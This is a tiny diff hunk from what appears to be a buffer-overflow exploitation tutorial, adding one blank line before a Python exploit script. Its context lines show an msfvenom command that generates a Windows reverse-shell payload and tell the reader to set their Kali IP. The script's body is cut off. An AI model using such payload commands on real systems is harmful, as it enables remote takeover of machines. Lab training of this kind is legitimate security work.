@@ -437,6 +437,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 EXITFUNC=thread
 *Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"*
 
 4. Edit the included script.
+
 ```python
 import socket
 from time import sleep
